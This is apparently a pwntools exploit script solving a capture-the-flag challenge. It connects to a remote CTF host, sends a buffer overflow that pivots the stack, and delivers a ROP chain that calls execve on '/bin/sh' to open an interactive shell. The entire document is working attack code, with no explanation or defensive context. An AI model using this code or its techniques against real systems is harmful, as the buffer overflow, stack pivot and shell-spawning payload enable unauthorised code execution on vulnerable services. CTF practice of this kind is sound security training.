from pwn import *

context(arch='amd64', os='linux')

#r=process("./pwn")
#gdb.attach(r)
r=remote("node1.tgctf.woooo.tech",32203)
pause()

pay1=b'2'+b"\x00"*3+p64(0x4021a7)+b"\xD2\x10\x40"
r.recvuntil(b"> ")
r.send(pay1)

r.recvuntil(b"Submit your feedback: ")

r.send(b"a"*0x100+p64(0x40100F)+p64(0x4021a0))
r.recvuntil(b"Thank you for your feedback!")
ret=0x40113F

pay2=p64(0x4022c7)+p64(0x4022c8)+p64(0x4022c8)+p64(0x40101B)+p64(0x40100a)+p64(0x401021)+p64(0x4022d0)+p64(0x401024)+p64(0x401000)+p64(0x401021)+p64(0x4022c8)+p64(0x40100a)+p64(0x401021)+p64(59)+p64(0x401024)+p64(0x401021)+p64(0)+p64(0x401153)
pay2=pay2.ljust(0x100,b"\x00")+p64(0x40100F)+p64(0x4021b8)+p64(ret)+b"/bin/sh\x00"
#0x4022b8
pause()
r.send(pay2)
r.interactive()
